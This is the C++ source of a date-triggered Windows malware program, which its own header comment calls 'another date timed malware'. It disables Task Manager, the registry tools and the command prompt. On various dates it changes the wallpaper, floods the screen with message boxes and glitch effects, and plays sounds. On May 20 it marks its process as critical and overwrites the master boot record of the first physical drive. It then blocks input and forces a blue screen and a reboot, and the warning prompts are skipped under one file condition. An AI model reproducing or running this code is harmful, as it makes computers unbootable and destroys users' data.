﻿// zwpapeiaziwhswna.cpp : another date timed malware
//

#include <Windows.h>
#include <tchar.h>
#include <math.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include "../background/data.h"
#include "bootrec.h"
#include "xpsnd.h"
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
HCRYPTPROV hProv;
INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
typedef enum tagCHECK_FOR_DATE_PARAM {
	DATE_YEAR = 0,
	DATE_MONTH,
	DATE_DAY_WEEK,
	DATE_DAY
} CHECK_FOR_DATE_PARAM, * LPCHECK_FOR_DATE_PARAM;

WORD CheckForDate(CHECK_FOR_DATE_PARAM cfdParam) {
	SYSTEMTIME lpSystemTime;
	GetSystemTime(&lpSystemTime);
	switch (cfdParam) {
	case DATE_YEAR:
		return lpSystemTime.wYear;
		break;
	case DATE_MONTH:
		return lpSystemTime.wMonth;
		break;
	case DATE_DAY_WEEK:
		return lpSystemTime.wDayOfWeek;
		break;
	case DATE_DAY:
		return lpSystemTime.wDay;
		break;
	}
}
DWORD WINAPI makeDirectory(LPVOID lpParam) { //First, it makes the directory.
	CreateDirectoryW(L"C:\\fish", NULL);
	return 0;
}
DWORD WINAPI makeFile(LPVOID lpParam) { //Secondly, it makes the file, credits to NTFSFormatted on that one
	DWORD dw;
	HANDLE hFile = CreateFileW(L"C:\\fish\\image_2025-09-01_173817246.bmp", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, WallpaperImage, 6629898, &dw, NULL);
	CloseHandle(hFile);

	return 0;
}
DWORD WINAPI changeBackground(LPVOID lpParam) { //Thirdly, It changes the background.
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (VOID*)L"C:/fish/image_2025-09-01_173817246.bmp", SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE);
	InvalidateRect(NULL, NULL, FALSE);
	return 0;
}
DWORD WINAPI rngMessage(LPVOID lpParam) {
	LPCWSTR string = L"Click on a button to start randomizing!\nThe buttons are randomized on each run.";

	while (1) {
		int fx = rand() % 7;

		DWORD msg = 0;
		msg += random() % 7;           // Random buttons
		msg += (random() % 5) << 4;    // Random icon

		MessageBoxW(NULL, string, L"zwpapeiaziwhswna msg generator", msg);

		//Some cool randomic strings
		if (fx == 0) string = L"unbiseptium will beat finale";
		if (fx == 1) string = L"Why do you love Sarah & Duck";
		if (fx == 2) string = L"خصمي اللدود ، ووشي اليابانية";
		if (fx == 3) string = L"IS UT True Tha tYOu Arwe oFKAIng Diperpoesioinm,,.,,,,,.,.,,.,.,.,.,.,.,.,,.,.,.,.'??????'+'+";
		if (fx == 4) string = L"Hey, Patrick!\nI thought of something funnier than 24.\n25!";
		if (fx == 5) string = L"Me toy - Maxi toys";
		if (fx == 6) string = L"The CreateDIBSection function creates a DIB that applications can write to directly. The function gives you a pointer to the location of the bitmap bit values. You can supply a handle to a file-mapping object that the function will use to create the bitmap, or you can let the system allocate the memory for the bitmap.";
	}
	return 0x00;
}
DWORD WINAPI weird(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(NULL);
		PatBlt(hdc, rand() % w, rand() % h, 100, 100, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI meltmess(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);;
	while (1) {
		HDC hdc = GetDC(NULL);
		BitBlt(hdc, rand() % w, 0, 100, h, hdc, rand() % w, 0, SRCCOPY);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			rgbScreen[i].r += x ^ y;
			rgbScreen[i].g += x & y;
			rgbScreen[i].b += x + y;
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		BitBlt(hdcMem, rand() % 40 - 20, 0, w, h, hdcMem, 0, rand() % 40 - 20, SRCCOPY);
		AlphaBlend(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI rectradius(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	int radius = 20;
	int numCircles = 100;
	int cx = sw / 2, cy = sh / 2;
	int dx = 50, dy = 20;
	while (1) {
		HDC desk = GetDC(0);
		for (int i = 0; i < numCircles; i++) {
			int spiralRadius = i;
			int x = cx + spiralRadius * cos(i * 0.2);
			int y = cy + spiralRadius * sin(i * 0.2);

			HBRUSH brush = CreateSolidBrush(Hue(1));
			SelectObject(desk, brush);

			RoundRect(desk, x - radius, y - radius, x + radius, y + radius, 10, 10);
			DeleteObject(brush);
		}
		cx += dx;
		cy += dy;
		if (cx + radius > sw || cx - radius < 0) dx = -dx;
		if (cy + radius > sh || cy - radius < 0) dy = -dy;
		ReleaseDC(0, desk);
		Sleep(10);
	}
	return 0x00;
}
DWORD WINAPI noinput(LPVOID lpParam) {
	while (1) {
		BlockInput(true);
		Sleep(10);
	}
	return 0x00;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (w - pcs->cx);
			int y = random() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Where do you get all these crazy ideas?", L"Tommy Pickles", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI MSGBX(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
		Sleep(1000);
	}
}
DWORD WINAPI sq(LPVOID lpParam) { //call me skidkoza 2 :fire:
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(NULL);

		RECT rect;
		rect.bottom = rand() % h + 1;
		rect.top = rand() % rect.bottom;
		rect.right = rand() % w + 1;
		rect.left = rand() % rect.right;

		FillRect(hdc, &rect, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 4 & t >> 4 ^ t >> 6) - 9 ^ t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	DWORD dwBytesWritten;
	HANDLE xpsnd = CreateFileW(
		L"C:\\fish\\xp_snd.wav", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(xpsnd, xpSound, 79540, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(xpsnd);
	PlaySoundW(L"C:\\fish\\sound3.wav", NULL, SND_LOOP | SND_ASYNC);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((3 * t & t >> 13 ^ t >> 6) * t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void reg_add( //credits to Mist0090 
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
	reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);

	while (1) {
		if (CheckForDate(DATE_MONTH) == 2 && CheckForDate(DATE_DAY) == 20)
		{
			MessageBoxW(NULL, L"Happy birthday Maxi Toys!", L"zwpapeiaziwhswna", MB_OK | MB_ICONERROR);
			ShellExecuteW(NULL, L"open", L"https://www.youtube.com/@MaxiToysOfficial", NULL, NULL, SW_SHOW);
			Sleep(-1);
		}
		if (CheckForDate(DATE_MONTH) == 8 && CheckForDate(DATE_DAY) == 30)
		{
			CreateThread(0, 0, makeDirectory, 0, 0, 0);
			Sleep(2000);
			CreateThread(0, 0, makeFile, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, changeBackground, 0, 0, 0);
			Sleep(-1);
		}
		if (CheckForDate(DATE_MONTH) == 3 && CheckForDate(DATE_DAY) == 2)
		{
			CreateThread(0, 0, rngMessage, 0, 0, 0);
			Sleep(-1);
		}
		if (CheckForDate(DATE_MONTH) == 6 && CheckForDate(DATE_DAY) == 18)
		{
			HANDLE thread1 = CreateThread(0, 0, weird, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, meltmess, 0, 0, 0);
			Sleep(-1);
		}
		if (CheckForDate(DATE_MONTH) == 5 && CheckForDate(DATE_DAY) == 20) {
			if (GetFileAttributesW(L"C:\\Windows\\dIIhost86.exe") == INVALID_FILE_ATTRIBUTES) { //holy competition
				if (MessageBoxW(NULL, L"You are now running the May 20th payload, which can make your entire computer unusable.\nDo you wish to proceed? The author Executioner/VenraTech isn't responsible.", L"May 20th", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
				if (MessageBoxW(NULL, L"Last chance you know what this does and you decided to hit yes", L"zwpapeiaziwhswna May 20th Payload", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
			}
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, noinput, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, rectradius, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, MSGBX, 0, 0, 0);
			sound2();
			Sleep(30000);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, sq, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000001 + random() % 0x38e, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			return 0;
		}
		Sleep(60000);
	}
}